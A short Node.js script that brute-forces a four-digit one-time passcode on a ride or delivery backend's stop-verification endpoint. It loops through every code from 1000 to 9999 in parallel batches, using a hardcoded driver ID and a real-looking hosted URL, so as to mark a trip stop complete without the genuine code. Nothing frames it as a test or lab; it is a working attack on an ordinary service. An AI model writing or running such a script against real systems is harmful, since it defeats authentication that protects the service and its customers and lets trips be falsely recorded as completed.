const fs = require('fs');
async function forceComplete() {
  const driverId = "e7eYigIsoZRjXxi4HJqrJXGXuHk2";
  const baseUrl = "https://pickup-backend-engine-v2.onrender.com/trips/T1";
  
  const stopId = "S1";
  console.log("Processing stop " + stopId);
  
  let foundOtp = null;
  console.log("  Brute forcing OTP...");
  for (let i=1000; i<=9999; i+=10) {
    const promises = [];
    for (let j=0; j<10; j++) {
      const otp = String(i + j);
      promises.push(fetch(baseUrl + "/stop/verify-otp", {
        method: "POST", headers: {"Content-Type": "application/json"},
        body: JSON.stringify({driverId, stopId, otp})
      }).then(async r => {
          if (r.ok) return otp;
          const text = await r.text();
          if (text.includes("already verified")) return "already_verified";
          return null;
      }).catch(e => null));
    }
    const res = await Promise.all(promises);
    const found = res.find(r => r);
    if (found) {
      foundOtp = found;
      console.log("  FOUND OTP: " + found);
      break;
    }
    await new Promise(resolve => setTimeout(resolve, 50));
  }
}
forceComplete();
